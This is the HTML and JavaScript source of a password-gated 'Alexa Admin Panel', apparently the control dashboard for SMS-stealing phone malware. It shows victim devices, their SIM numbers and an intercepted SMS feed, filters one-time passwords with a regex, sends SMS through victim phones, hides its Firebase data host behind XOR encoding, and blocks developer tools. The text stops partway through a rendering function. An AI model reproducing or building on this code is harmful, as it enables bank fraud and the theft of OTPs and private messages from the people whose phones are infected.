<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<title>Alexa Admin Panel</title>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
<style>
*{margin:0;padding:0;box-sizing:border-box}
:root{--glass:rgba(255,255,255,0.06);--glass-border:rgba(255,255,255,0.10);--shadow:0 8px 32px rgba(0,0,0,0.4);--primary:#f59e0b;--primary-dark:#d97706;--primary-glow:rgba(245,158,11,0.3);--secondary:#ec4899;--accent:#06b6d4;--success:#22c55e;--danger:#ef4444;--warning:#f59e0b;--text:#f1f5f9;--text-dim:rgba(255,255,255,0.4);--bg:#050508}
html{scroll-behavior:smooth}body{font-family:'Inter',sans-serif;background:var(--bg);color:var(--text);min-height:100vh;overflow-x:hidden}
#bg-canvas{position:fixed;top:0;left:0;width:100vw;height:100vh;z-index:0;pointer-events:none}
#loading-overlay{position:fixed;inset:0;z-index:9999;display:flex;align-items:center;justify-content:center;background:var(--bg);transition:opacity .8s ease,transform .8s ease}
#loading-overlay.hidden{opacity:0;transform:scale(1.15);pointer-events:none}
.loader-ring-container{position:relative;width:180px;height:180px;display:flex;align-items:center;justify-content:center}
.loader-ring-outer{position:absolute;inset:0;border:2px solid transparent;border-top-color:var(--primary);border-right-color:var(--secondary);border-radius:50%;animation:spin 1.2s cubic-bezier(.4,0,.2,1) infinite}
.loader-ring-mid{position:absolute;inset:15px;border:2px solid transparent;border-bottom-color:var(--accent);border-left-color:var(--primary);border-radius:50%;animation:spin 1.8s cubic-bezier(.4,0,.2,1) infinite reverse}
.loader-ring-inner{position:absolute;inset:30px;border:2px solid transparent;border-top-color:var(--secondary);border-right-color:var(--accent);border-radius:50%;animation:spin 1s cubic-bezier(.4,0,.2,1) infinite}
.loader-logo{width:48px;height:48px;background:linear-gradient(135deg,var(--primary),var(--secondary));border-radius:16px;display:flex;align-items:center;justify-content:center;font-size:22px;font-weight:900;color:#fff;z-index:1;animation:loader-pulse 2s ease-in-out infinite;box-shadow:0 0 40px var(--primary-glow)}.loader-text{position:absolute;bottom:-40px;font-size:11px;font-weight:600;letter-spacing:4px;text-transform:uppercase;background:linear-gradient(135deg,var(--primary),var(--secondary),var(--accent));-webkit-background-clip:text;-webkit-text-fill-color:transparent}
@keyframes loader-pulse{0%,100%{box-shadow:0 0 30px var(--primary-glow);transform:scale(1)}50%{box-shadow:0 0 60px var(--primary-glow);transform:scale(1.05)}}@keyframes spin{to{transform:rotate(360deg)}}
#auth-page{position:fixed;inset:0;z-index:10;display:flex;align-items:center;justify-content:center;transition:opacity .8s ease,transform .8s ease}
#auth-page.hidden{opacity:0;transform:scale(1.1);pointer-events:none}
.auth-bg{position:absolute;inset:0;background:radial-gradient(ellipse at 20% 50%,rgba(245,158,11,0.08) 0%,transparent 50%),radial-gradient(ellipse at 80% 50%,rgba(236,72,153,0.08) 0%,transparent 50%)}
.auth-card{position:relative;width:420px;padding:56px 40px 40px;background:rgba(10,10,18,0.85);border:1px solid rgba(255,255,255,0.08);border-radius:28px;backdrop-filter:blur(40px);box-shadow:0 24px 80px rgba(0,0,0,0.6)}
.auth-card::before{content:'';position:absolute;top:0;left:0;right:0;height:1px;background:linear-gradient(90deg,transparent,var(--primary),var(--secondary),transparent)}
.auth-logo-wrap{width:80px;height:80px;margin:0 auto 24px;position:relative}
.auth-logo-ring{position:absolute;inset:-4px;border:2px solid transparent;border-top-color:var(--primary);border-right-color:var(--secondary);border-radius:50%;animation:spin 4s linear infinite}
.auth-logo-ring-2{position:absolute;inset:-8px;border:1px solid transparent;border-bottom-color:var(--accent);border-left-color:var(--primary);border-radius:50%;animation:spin 6s linear infinite reverse}
.auth-logo-box{width:100%;height:100%;background:linear-gradient(135deg,var(--primary),var(--secondary));border-radius:22px;display:flex;align-items:center;justify-content:center;font-size:30px;font-weight:900;color:#fff;box-shadow:0 0 50px var(--primary-glow);position:relative;z-index:1}
.auth-title{text-align:center;font-size:22px;font-weight:800;background:linear-gradient(135deg,var(--text),var(--primary));-webkit-background-clip:text;-webkit-text-fill-color:transparent;margin-bottom:4px}
.auth-subtitle{text-align:center;color:var(--text-dim);font-size:13px;margin-bottom:32px;letter-spacing:2px;font-weight:500}
.input-wrap{position:relative;margin-bottom:20px}
.input-wrap i{position:absolute;left:16px;top:50%;transform:translateY(-50%);color:var(--text-dim);font-size:16px;pointer-events:none}
.auth-input{width:100%;padding:16px 16px 16px 46px;background:rgba(0,0,0,0.4);border:1px solid rgba(255,255,255,0.06);border-radius:14px;color:var(--text);font-size:15px;font-family:inherit;outline:none;transition:all .4s ease}
.auth-input:focus{border-color:var(--primary);box-shadow:0 0 30px var(--primary-glow),inset 0 0 30px rgba(245,158,11,0.03)}
.auth-btn{width:100%;padding:16px;border:none;border-radius:14px;background:linear-gradient(135deg,var(--primary),var(--secondary));color:#fff;font-size:16px;font-weight:700;font-family:inherit;cursor:pointer;transition:all .4s ease;position:relative;overflow:hidden}
.auth-btn:hover{transform:translateY(-2px);box-shadow:0 12px 40px var(--primary-glow)}
.auth-error{color:var(--danger);font-size:13px;text-align:center;margin-top:14px;display:none}
#granted-overlay{position:fixed;inset:0;z-index:50;display:none;align-items:center;justify-content:center;background:rgba(0,0,0,0.85);backdrop-filter:blur(20px)}
#granted-overlay.active{display:flex}.granted-box{text-align:center;animation:grantedIn .6s ease}
@keyframes grantedIn{from{opacity:0;transform:scale(.5) rotate(-5deg)}to{opacity:1;transform:scale(1) rotate(0deg)}}
.granted-icon{width:100px;height:100px;margin:0 auto 24px;background:linear-gradient(135deg,var(--success),#16a34a);border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:44px;box-shadow:0 0 80px rgba(34,197,94,0.4)}
.granted-text{font-size:36px;font-weight:900;background:linear-gradient(135deg,var(--success),#4ade80);-webkit-background-clip:text;-webkit-text-fill-color:transparent;letter-spacing:4px}
.granted-sub{color:var(--text-dim);font-size:14px;margin-top:8px;letter-spacing:6px;text-transform:uppercase}
#dashboard{position:relative;z-index:1;padding:20px;max-width:1500px;margin:0 auto;display:none}
.top-bar{display:flex;align-items:center;justify-content:space-between;padding:14px 22px;margin-bottom:24px;background:rgba(10,10,18,0.8);border:1px solid rgba(255,255,255,0.06);border-radius:18px;backdrop-filter:blur(20px);flex-wrap:wrap;gap:10px}
.top-left{display:flex;align-items:center;gap:14px}
.top-logo{width:38px;height:38px;background:linear-gradient(135deg,var(--primary),var(--secondary));border-radius:12px;display:flex;align-items:center;justify-content:center;font-size:16px;font-weight:900;color:#fff;box-shadow:0 0 20px var(--primary-glow)}
.top-title{font-size:17px;font-weight:800;background:linear-gradient(135deg,var(--text),var(--primary));-webkit-background-clip:text;-webkit-text-fill-color:transparent}
.top-sub{font-size:11px;color:var(--text-dim);letter-spacing:2px;font-weight:500}
.top-badge{padding:4px 14px;background:linear-gradient(135deg,rgba(245,158,11,0.15),rgba(236,72,153,0.15));border:1px solid rgba(245,158,11,0.2);border-radius:20px;font-size:10px;font-weight:700;color:var(--primary);letter-spacing:1px}
.top-right{display:flex;align-items:center;gap:10px;flex-wrap:wrap}
.btn-ghost{padding:8px 16px;border:1px solid rgba(255,255,255,0.06);border-radius:10px;background:rgba(255,255,255,0.03);color:var(--text-dim);font-size:12px;font-weight:500;font-family:inherit;cursor:pointer;transition:all .3s ease}
.btn-ghost:hover{background:rgba(255,255,255,0.06);color:var(--text)}
.search-box{position:relative;width:220px}
.search-box input{width:100%;padding:9px 12px 9px 34px;background:rgba(0,0,0,0.4);border:1px solid rgba(255,255,255,0.06);border-radius:10px;color:var(--text);font-size:12px;font-family:inherit;outline:none;transition:all .3s ease}
.search-box input:focus{border-color:var(--primary);box-shadow:0 0 20px var(--primary-glow)}
.search-box i{position:absolute;left:10px;top:50%;transform:translateY(-50%);color:var(--text-dim);font-size:13px;pointer-events:none}
.stats-row{display:grid;grid-template-columns:repeat(auto-fit,minmax(160px,1fr));gap:12px;margin-bottom:24px}
.stat-tile{padding:18px 20px;background:rgba(10,10,18,0.6);border:1px solid rgba(255,255,255,0.05);border-radius:16px;backdrop-filter:blur(12px);text-align:center;transition:all .4s ease;position:relative;overflow:hidden}
.stat-tile::before{content:'';position:absolute;top:0;left:0;right:0;height:2px;opacity:0;transition:opacity .4s ease}
.stat-tile:hover::before{opacity:1}
.stat-tile:nth-child(1)::before{background:linear-gradient(90deg,var(--primary),var(--secondary))}
.stat-tile:nth-child(2)::before{background:var(--success)}
.stat-tile:nth-child(3)::before{background:var(--accent)}
.stat-tile:nth-child(4)::before{background:var(--secondary)}
.stat-tile:nth-child(5)::before{background:var(--warning)}
.stat-tile:nth-child(6)::before{background:var(--danger)}
.stat-tile:hover{transform:translateY(-4px);border-color:rgba(255,255,255,0.1)}
.stat-tile-num{font-size:28px;font-weight:900;line-height:1;margin-bottom:4px}
.stat-tile-label{font-size:11px;color:var(--text-dim);font-weight:600;text-transform:uppercase;letter-spacing:1px}
.tab-nav{display:flex;gap:2px;margin-bottom:20px;padding:4px;background:rgba(10,10,18,0.6);border:1px solid rgba(255,255,255,0.05);border-radius:14px;overflow-x:auto;flex-wrap:nowrap}
.tab-nav::-webkit-scrollbar{display:none}
.tab-btn{padding:9px 20px;border:none;border-radius:10px;background:transparent;color:var(--text-dim);font-size:12px;font-weight:600;font-family:inherit;cursor:pointer;transition:all .3s ease;white-space:nowrap}
.tab-btn:hover{color:var(--text)}
.tab-btn.active{background:linear-gradient(135deg,rgba(245,158,11,0.15),rgba(236,72,153,0.15));color:var(--primary);box-shadow:0 4px 16px var(--primary-glow)}
.tab-pane{display:none}.tab-pane.active{display:block;animation:fadeUp .5s ease}
@keyframes fadeUp{from{opacity:0;transform:translateY(16px)}to{opacity:1;transform:translateY(0)}}
.device-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(280px,1fr));gap:12px}
.device-card{background:rgba(10,10,18,0.6);border:1px solid rgba(255,255,255,0.05);border-radius:16px;backdrop-filter:blur(12px);overflow:hidden;transition:all .4s ease;cursor:pointer;position:relative}
.device-card::before{content:'';position:absolute;top:0;left:0;right:0;height:1px;background:linear-gradient(90deg,transparent,rgba(245,158,11,0.3),rgba(236,72,153,0.3),transparent);opacity:0;transition:opacity .4s ease}
.device-card:hover::before{opacity:1}
.device-card:hover{transform:translateY(-4px);border-color:rgba(245,158,11,0.15);box-shadow:0 16px 48px rgba(0,0,0,0.4)}
.device-card-top{padding:14px 18px;display:flex;align-items:center;justify-content:space-between;border-bottom:1px solid rgba(255,255,255,0.03)}
.device-card-name{font-size:14px;font-weight:700;display:flex;align-items:center;gap:8px}
.status-dot{width:7px;height:7px;border-radius:50%;display:inline-block}
.status-dot.online{background:var(--success);box-shadow:0 0 10px rgba(34,197,94,0.5)}
.status-dot.offline{background:var(--text-dim)}
.device-card-id{font-size:10px;color:var(--text-dim);font-weight:500}
.device-card-body{padding:12px 18px 14px}
.device-row{display:flex;justify-content:space-between;align-items:center;padding:4px 0;font-size:12px}
.device-row .lbl{color:var(--text-dim);font-weight:500;min-width:65px}
.device-row .val{font-weight:600;text-align:right;max-width:58%;word-break:break-all}
.bat-bar{display:flex;align-items:center;gap:6px}
.bat-fill{height:12px;border-radius:4px;background:var(--success);min-width:4px;transition:width .4s ease}
.bat-fill.mid{background:var(--warning)}.bat-fill.low{background:var(--danger)}
.bat-pct{font-size:11px;font-weight:700}
.detail-page{position:fixed;inset:0;z-index:50;display:none;background:var(--bg);overflow-y:auto}
.detail-page.active{display:block;animation:fadeUp .4s ease}
.detail-head{position:sticky;top:0;z-index:10;padding:16px 24px;background:rgba(5,5,8,0.95);border-bottom:1px solid rgba(255,255,255,0.05);backdrop-filter:blur(20px);display:flex;align-items:center;justify-content:space-between}
.detail-back{width:36px;height:36px;border:1px solid rgba(255,255,255,0.06);border-radius:10px;background:rgba(255,255,255,0.03);color:var(--text);font-size:16px;cursor:pointer;display:flex;align-items:center;justify-content:center;transition:all .3s ease}
.detail-back:hover{background:rgba(245,158,11,0.1);border-color:var(--primary)}
.detail-title{font-size:18px;font-weight:700}
.detail-body{max-width:900px;margin:0 auto;padding:24px}
.detail-grid{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-bottom:28px}
.detail-cell{padding:14px 18px;background:rgba(10,10,18,0.6);border:1px solid rgba(255,255,255,0.05);border-radius:14px}
.detail-cell .l{font-size:10px;color:var(--text-dim);font-weight:500;text-transform:uppercase;letter-spacing:.5px;margin-bottom:4px}
.detail-cell .v{font-size:14px;font-weight:600}
.detail-sms-title{font-size:14px;font-weight:700;margin-bottom:12px;color:var(--text-dim);text-transform:uppercase;letter-spacing:1px}
.detail-sms-list{display:flex;flex-direction:column;gap:6px;padding-bottom:40px}
.detail-sms{padding:12px 16px;background:rgba(10,10,18,0.4);border:1px solid rgba(255,255,255,0.04);border-radius:12px;transition:all .3s ease}
.detail-sms:hover{border-color:rgba(245,158,11,0.08);background:rgba(245,158,11,0.02)}
.detail-sms .sh{display:flex;justify-content:space-between;align-items:center;margin-bottom:4px}
.detail-sms .sf{font-size:12px;font-weight:700;color:var(--accent)}
.detail-sms .sw{font-size:10px;color:var(--text-dim)}
.detail-sms .st{font-size:13px;color:rgba(255,255,255,0.75);line-height:1.5}
.sms-feed{display:flex;flex-direction:column;gap:4px}
.sms-feed-item{padding:10px 14px;background:rgba(10,10,18,0.4);border:1px solid rgba(255,255,255,0.03);border-radius:10px;font-size:12px;transition:all .3s ease;cursor:pointer}
.sms-feed-item:hover{border-color:rgba(245,158,11,0.1);background:rgba(245,158,11,0.03)}
.sms-feed-item .sf-sender{font-weight:700;color:var(--accent)}
.sms-feed-item .sf-body{color:rgba(255,255,255,0.7);display:block;margin-top:2px}
.sms-feed-item .sf-meta{font-size:10px;color:var(--text-dim);display:flex;gap:10px;margin-top:2px}
.empty-state{text-align:center;padding:60px 20px;color:var(--text-dim)}
.empty-state .icon{font-size:40px;margin-bottom:12px;opacity:0.4}
.empty-state .msg{font-size:14px;font-weight:500}
.modal-overlay{position:fixed;inset:0;z-index:100;display:none;align-items:center;justify-content:center;background:rgba(0,0,0,0.7);backdrop-filter:blur(8px)}
.modal-overlay.active{display:flex}
.modal-box{width:420px;max-width:92%;padding:32px;background:rgba(10,10,18,0.95);border:1px solid rgba(255,255,255,0.08);border-radius:24px;box-shadow:0 24px 80px rgba(0,0,0,0.6);animation:modalIn .3s ease}
@keyframes modalIn{from{opacity:0;transform:scale(.9) translateY(20px)}to{opacity:1;transform:scale(1) translateY(0)}}
.modal-title{font-size:18px;font-weight:800;margin-bottom:20px;text-align:center;background:linear-gradient(135deg,var(--accent),var(--primary));-webkit-background-clip:text;-webkit-text-fill-color:transparent}
.modal-input{width:100%;padding:12px 16px;margin-bottom:12px;background:rgba(0,0,0,0.4);border:1px solid rgba(255,255,255,0.06);border-radius:12px;color:var(--text);font-size:14px;font-family:inherit;outline:none;transition:all .3s ease}
.modal-input:focus{border-color:var(--primary);box-shadow:0 0 20px var(--primary-glow)}
.modal-row{display:flex;gap:10px;margin-bottom:12px}
.modal-btn{flex:1;padding:12px;border:none;border-radius:12px;font-size:13px;font-weight:600;font-family:inherit;cursor:pointer;transition:all .3s ease}
.modal-btn.primary{background:linear-gradient(135deg,var(--accent),var(--primary));color:#fff}
.modal-btn.primary:hover{transform:translateY(-2px);box-shadow:0 8px 24px rgba(6,182,212,0.3)}
.modal-btn.secondary{background:rgba(255,255,255,0.05);color:var(--text-dim);border:1px solid rgba(255,255,255,0.06)}
.modal-btn.secondary:hover{background:rgba(255,255,255,0.1);color:var(--text)}
.toast-box{position:fixed;top:20px;right:20px;z-index:999;display:flex;flex-direction:column;gap:8px}
.toast{padding:12px 18px;background:rgba(10,10,18,0.95);border:1px solid rgba(255,255,255,0.08);border-radius:12px;backdrop-filter:blur(20px);font-size:13px;font-weight:500;display:flex;align-items:center;gap:10px;animation:toastIn .4s ease}
.toast.success{border-color:rgba(34,197,94,0.3)}
.toast.error{border-color:rgba(239,68,68,0.3)}
@keyframes toastIn{from{opacity:0;transform:translateX(40px)}to{opacity:1;transform:translateX(0)}}
.toast.out{animation:toastOut .4s ease forwards}
@keyframes toastOut{from{opacity:1;transform:translateX(0)}to{opacity:0;transform:translateX(40px)}}
.for-sms-controls{display:flex;gap:8px;margin-bottom:12px;flex-wrap:wrap}
.for-sms-controls input{flex:1;min-width:120px;padding:10px 14px;background:rgba(0,0,0,0.4);border:1px solid rgba(255,255,255,0.06);border-radius:10px;color:var(--text);font-size:13px;font-family:inherit;outline:none;transition:all .3s ease}
.for-sms-controls input:focus{border-color:var(--accent)}
.for-sms-controls button{padding:10px 20px;border:none;border-radius:10px;background:linear-gradient(135deg,var(--accent),var(--primary));color:#fff;font-size:13px;font-weight:600;font-family:inherit;cursor:pointer;transition:all .3s ease}
.for-sms-controls button:hover{transform:translateY(-2px);box-shadow:0 8px 24px rgba(6,182,212,0.3)}
::-webkit-scrollbar{width:5px}::-webkit-scrollbar-track{background:transparent}::-webkit-scrollbar-thumb{background:rgba(255,255,255,0.06);border-radius:3px}
@media(max-width:768px){
  .top-bar{flex-direction:column;align-items:stretch}
  .stats-row{grid-template-columns:repeat(3,1fr)}
  .device-grid{grid-template-columns:1fr}
  .auth-card{width:92%;padding:40px 24px 32px}
  .detail-grid{grid-template-columns:1fr}
}
</style>
</head>
<body>
<canvas id="bg-canvas"></canvas>
<div id="loading-overlay"><div class="loader-ring-container"><div class="loader-ring-outer"></div><div class="loader-ring-mid"></div><div class="loader-ring-inner"></div><div class="loader-logo">AX</div><div class="loader-text">Alexa Admin</div></div></div>
<div class="toast-box" id="toast-box"></div>

<div id="auth-page"><div class="auth-bg"></div><div class="auth-card"><div class="auth-logo-wrap"><div class="auth-logo-ring"></div><div class="auth-logo-ring-2"></div><div class="auth-logo-box">AX</div></div><div class="auth-title">Alexa Admin Panel</div><div class="auth-subtitle">ENTER PASSWORD</div><div class="input-wrap"><i>&#128273;</i><input class="auth-input" id="pass-input" type="password" placeholder="&#9679;&#9679;&#9679;&#9679;&#9679;&#9679;" autocomplete="off"></div><button class="auth-btn" id="login-btn">&#10148; ACCESS</button><div class="auth-error" id="auth-error">Wrong Password</div></div></div>

<div id="granted-overlay"><div class="granted-box"><div class="granted-icon">&#10003;</div><div class="granted-text">ACCESS GRANTED</div><div class="granted-sub">Alexa Admin Panel V1</div></div></div>

<div id="dashboard">
<div class="top-bar">
<div class="top-left"><div class="top-logo">AX</div><div><div class="top-title">Alexa Admin Panel</div><div class="top-sub">&#9679; LIVE &middot; Auto-Sync</div></div><div class="top-badge">&#9733; PREMIUM</div></div>
<div class="top-right">
<div class="search-box"><i>&#128269;</i><input type="text" id="search-input" placeholder="Search..." oninput="filterView()"></div>
<button class="btn-ghost" onclick="loadData();t('Refreshed','success')">&#8635; Refresh</button>
<button class="btn-ghost" onclick="openSmsModal('')">&#9993; Send SMS</button>
</div></div>

<div class="stats-row" id="stats-row">
<div class="stat-tile"><div class="stat-tile-num" id="st-total">0</div><div class="stat-tile-label">Total Devices</div></div>
<div class="stat-tile"><div class="stat-tile-num" id="st-online">0</div><div class="stat-tile-label">Online</div></div>
<div class="stat-tile"><div class="stat-tile-num" id="st-sms">0</div><div class="stat-tile-label">Total SMS</div></div>
<div class="stat-tile"><div class="stat-tile-num" id="st-otp">0</div><div class="stat-tile-label">OTPs</div></div>
<div class="stat-tile"><div class="stat-tile-num" id="st-viewers">0</div><div class="stat-tile-label">Active Viewers</div></div>
</div>

<div class="tab-nav">
<button class="tab-btn active" onclick="switchTab('all',this)">&#128187; All</button>
<button class="tab-btn" onclick="switchTab('online',this)">&#128994; Online</button>
<button class="tab-btn" onclick="switchTab('sms',this)">&#128172; SMS Feed</button>
<button class="tab-btn" onclick="switchTab('otp',this)">&#128272; OTPs</button>
</div>
<div class="tab-pane active" id="pane-all"><div class="device-grid" id="grid-all"></div></div>
<div class="tab-pane" id="pane-online"><div class="device-grid" id="grid-online"></div></div>
<div class="tab-pane" id="pane-sms"><div class="sms-feed" id="sms-feed"></div></div>
<div class="tab-pane" id="pane-otp"><div id="otp-container"></div></div>
</div>

<div class="detail-page" id="detail-page">
<div class="detail-head"><button class="detail-back" onclick="closeDetail()">&#8592;</button><div class="detail-title" id="detail-title">Device</div><button class="btn-ghost" onclick="openSmsModal(document.getElementById('detail-title').textContent.replace('Device: ',''))">&#9993; SMS</button></div>
<div class="detail-body" id="detail-body"></div>
</div>

<div class="modal-overlay" id="sms-modal">
<div class="modal-box">
<div class="modal-title">&#9993; Send SMS</div>
<input class="modal-input" id="sms-did" placeholder="Device ID">
<input class="modal-input" id="sms-num" placeholder="Phone Number (+91...)">
<input class="modal-input" id="sms-msg" placeholder="Message text">
<div class="modal-row">
<button class="modal-btn secondary" onclick="closeSmsModal()">Cancel</button>
<button class="modal-btn primary" onclick="sendSms()">&#10148; Send</button>
</div></div></div>

<script>
document.addEventListener('contextmenu',e=>{if(!e.target.closest('.device-card')&&!e.target.closest('.detail-sms')&&!e.target.closest('.detail-cell'))e.preventDefault()});
document.addEventListener('keydown',e=>{if(e.key==='F12'||e.ctrlKey&&e.shiftKey&&['I','C','J'].includes(e.key.toUpperCase())||e.ctrlKey&&['u','U','s','S'].includes(e.key)){e.preventDefault();return false}});
Object.defineProperty(document,'oncontextmenu',{get:()=>e=>e.preventDefault()});
(function(){let _c=0;const _d=/./;_d.toString=function(){_c++};const _e=/./;_e.toString=function(){_c++};setInterval(function(){if(window.outerHeight-window.innerHeight>200||window.outerWidth-window.innerWidth>200)_c+=3;if(_c>2){document.body.innerHTML='';document.title='Access Denied'}},1000)}());
const c=document.getElementById('bg-canvas'),cx=c.getContext('2d');let W,H,pts=[];
function resize(){W=c.width=innerWidth;H=c.height=innerHeight}
resize();addEventListener('resize',resize);
class Pt{constructor(){this.reset()}reset(){this.x=Math.random()*W;this.y=Math.random()*H;this.s=Math.random()*2.5+0.5;this.vx=(Math.random()-0.5)*0.4;this.vy=(Math.random()-0.5)*0.4;this.o=Math.random()*0.25+0.05}update(){this.x+=this.vx;this.y+=this.vy;if(this.x<0||this.x>W||this.y<0||this.y>H)this.reset()}draw(){cx.beginPath();cx.arc(this.x,this.y,this.s,0,Math.PI*2);cx.fillStyle='rgba(255,255,255,'+this.o+')';cx.fill()}}
for(let i=0;i<60;i++)pts.push(new Pt());
function anim(){cx.fillStyle='rgba(5,5,8,0.12)';cx.fillRect(0,0,W,H);pts.forEach(p=>{p.update();p.draw()});for(let i=0;i<pts.length;i++)for(let j=i+1;j<pts.length;j++){let dx=pts[i].x-pts[j].x,dy=pts[i].y-pts[j].y,d=dx*dx+dy*dy;if(d<120*120){cx.beginPath();cx.moveTo(pts[i].x,pts[i].y);cx.lineTo(pts[j].x,pts[j].y);cx.strokeStyle='rgba(255,255,255,'+(0.04*(1-d/(120*120)))+')';cx.lineWidth=0.5;cx.stroke()}}requestAnimationFrame(anim)}
anim();

const _e=[109,113,113,117,118,63,42,42,124,106,107,106,40,100,97,54,40,97,96,99,100,112,105,113,40,119,113,97,103,43,99,108,119,96,103,100,118,96,108,106,43,102,106,104];
const FB=String.fromCharCode.apply(null,_e.map(function(x){return x^5}));
let data={clients:{},profex:{},forwardSms:{}};

function t(m,tp){const box=document.getElementById('toast-box');const el=document.createElement('div');el.className='toast '+tp;el.innerHTML='<span>'+(tp==='success'?'&#10003;':tp==='error'?'&#10007;':'&#9432;')+'</span> '+m;box.appendChild(el);setTimeout(()=>{el.classList.add('out');setTimeout(()=>el.remove(),400);},2500);}

document.getElementById('pass-input').addEventListener('keydown',e=>{if(e.key==='Enter')login()});
document.getElementById('login-btn').addEventListener('click',login);

async function login(){
  const p=document.getElementById('pass-input').value;
  const err=document.getElementById('auth-error');
  if(!p){err.textContent='Enter password';err.style.display='block';return}
  try{
    const r=await fetch('/api/auth',{method:'POST',body:JSON.stringify({pass:p,ua:navigator.userAgent.slice(0,60)})});
    const j=await r.json();
    if(j.ok){
      localStorage.setItem('alexa_pass',p);
      localStorage.setItem('alexa_ts',Date.now());
      fetch('/api/login',{method:'POST',body:JSON.stringify({pass:p,ua:navigator.userAgent.slice(0,60)})}).catch(()=>{});
      err.style.display='none';
      document.getElementById('auth-page').classList.add('hidden');
      const go=document.getElementById('granted-overlay');
      go.classList.add('active');
      setTimeout(()=>{
        go.classList.remove('active');
        document.getElementById('dashboard').style.display='block';
        loadData();
        startSync();
        updateViewers();
        t('Access Granted','success');
        startPassCheck();
      },1800);
    }else{err.textContent='Wrong Password';err.style.display='block';document.getElementById('pass-input').value='';setTimeout(()=>err.style.display='none',2000);}
  }catch(e){err.textContent='Server error';err.style.display='block';setTimeout(()=>err.style.display='none',2000);}
}

(async function autoLogin(){
  const saved=localStorage.getItem('alexa_pass');
  if(saved){
    try{
      const r=await fetch('/api/auth',{method:'POST',body:JSON.stringify({pass:saved})});
      const j=await r.json();
      if(j.ok){
        document.getElementById('auth-page').classList.add('hidden');
        const go=document.getElementById('granted-overlay');
        go.classList.add('active');
        setTimeout(()=>{
          go.classList.remove('active');
          document.getElementById('dashboard').style.display='block';
          loadData();
          startSync();
          updateViewers();
          startPassCheck();
        },1800);
        return;
      }
    }catch(e){}
  }
  localStorage.removeItem('alexa_pass');
})();

let passTimer=null;
function startPassCheck(){
  if(passTimer)clearInterval(passTimer);
  passTimer=setInterval(async()=>{
    const p=localStorage.getItem('alexa_pass');
    if(!p)return;
    try{
      const r=await fetch('/api/check?pass='+encodeURIComponent(p));
      const j=await r.json();
      if(!j.valid){
        localStorage.removeItem('alexa_pass');
        if(passTimer)clearInterval(passTimer);
        document.getElementById('dashboard').style.display='none';
        document.getElementById('auth-page').classList.remove('hidden');
        document.getElementById('pass-input').value='';
        t('Session expired - password deleted','error');
      }
    }catch(e){}
  },10000);
}

async function fbFetch(path){
  try{
    const r=await fetch(FB+'/'+path+'.json');
    return await r.json();
  }catch(e){return null}
}

async function loadData(){
  const[cl,p,fw]=await Promise.all([fbFetch('clients'),fbFetch('profex_incoming'),fbFetch('forwardSms')]);
  if(cl)data.clients=cl;
  if(p)data.profex=p;
  if(fw)data.forwardSms=fw;
  updateAll();
}

let syncTimer=null;
function startSync(){
  if(syncTimer)clearInterval(syncTimer);
  syncTimer=setInterval(async()=>{
    const[cl,p,fw]=await Promise.all([fbFetch('clients'),fbFetch('profex_incoming'),fbFetch('forwardSms')]);
    if(cl)data.clients=cl;
    if(p)data.profex=p;
    if(fw)data.forwardSms=fw;
    updateAll();
    updateViewers();
  },5000);
}

function isOTP(msg){
  if(!msg)return false;
  const kw=/otp|one\s*time|verification\s*code|auth\s*code|login\s*code|secure\s*code|verif|captcha|pin\s*number|mPin/i.test(msg);
  const num=/\b\d{4,8}\b/.test(msg);
  const bad=/rs\.?\s|rs\.?\d|debit|credit|balance|account\s*xx|ref(?:erence)?\s*no/i.test(msg);
  if(!num)return false;
  if(kw&&!bad)return true;
  if(num&&!/rs\.?\s|debit|credited/i.test(msg)&&msg.length<160)return true;
  return false;
}
function updateAll(){
  const cl=data.clients,ids=Object.keys(cl);
  let on=0,smsTotal=0,otpTotal=0;
  ids.forEach(id=>{const d=cl[id];if(d.status===true)on++;if(d.messages){Object.values(d.messages).forEach(s=>{smsTotal++;if(isOTP(s.message))otpTotal++})}});
  document.getElementById('st-total').textContent=ids.length;
  document.getElementById('st-online').textContent=on;
  document.getElementById('st-sms').textContent=smsTotal;
  document.getElementById('st-otp').textContent=otpTotal;
  renderAll();
  renderOnline();
  renderAllSms();
  renderOtps();
  if(window._currentDevice)renderDetail(window._currentDevice);
}
async function updateViewers(){
  try{
    const r=await fetch('/api/logins');
    const logs=await r.json();
    const active=logs.filter(l=>Date.now()-l.ts<300000).length;
    document.getElementById('st-viewers').textContent=active;
  }catch(e){}
}

function batHTML(b){
  if(typeof b!=='string')return'<span class="bat-pct">-</span>';
  const pct=parseInt(b);
  if(isNaN(pct))return'<span class="bat-pct">'+b+'</span>';
  const cls=pct>50?'':(pct>20?'mid':'low');
  return'<div class="bat-bar"><div class="bat-fill '+cls+'" style="width:'+Math.min(pct,100)+'px"></div><span class="bat-pct">'+b+'</span></div>';
}

function simHTML(sims){
  if(!sims||!sims.length)return'<span style="color:var(--text-dim);font-size:11px;">No SIM</span>';
  return sims.map(s=>{
    const num=s.phoneNumber&&s.phoneNumber!=='Unknown'?s.phoneNumber:'-';
    const carrier=s.carrierName||'';
    const n=num.replace(/[^0-9]/g,'');
    return'<div style="font-size:11px;line-height:1.4;display:flex;align-items:center;gap:6px;"><span style="color:var(--accent);">'+(carrier||'SIM')+'</span> <span style="font-weight:600;">'+(num||'-')+'</span>'+(!num||num==='-'?'':'<span onclick="copyText(\''+n+'\')" style="cursor:pointer;color:var(--primary);font-size:10px;padding:2px 6px;border:1px solid rgba(245,158,11,0.3);border-radius:4px;">Copy</span>')+'</div>';
  }).join('');
}
function copyText(v){navigator.clipboard.writeText(v).then(()=>{t('Copied','success')}).catch(()=>{const el=document.createElement('textarea');el.value=v;document.body.appendChild(el);el.select();document.execCommand('copy');document.body.removeChild(el);t('Copied','success')})}
function devCard(id,d,i){
  const st=d.status===true;
  const bat=d.battery||'?';
  const last=d.messages?Object.values(d.messages).sort((a,b)=>b.id-a.id)[0]:null;
  return'<div class="device-card" style="animation-delay:'+(i*0.04)+'s" onclick="openDetail(\''+id+'\')">'
    +'<div class="device-card-top"><div class="device-card-name"><span class="status-dot '+(st?'online':'offline')+'"></span>Device</div><div class="device-card-id">'+id.slice(0,8)+'</div></div>'
    +'<div class="device-card-body">'
    +'<div class="device-row"><span class="lbl">Battery</span>'+batHTML(bat)+'</div>'
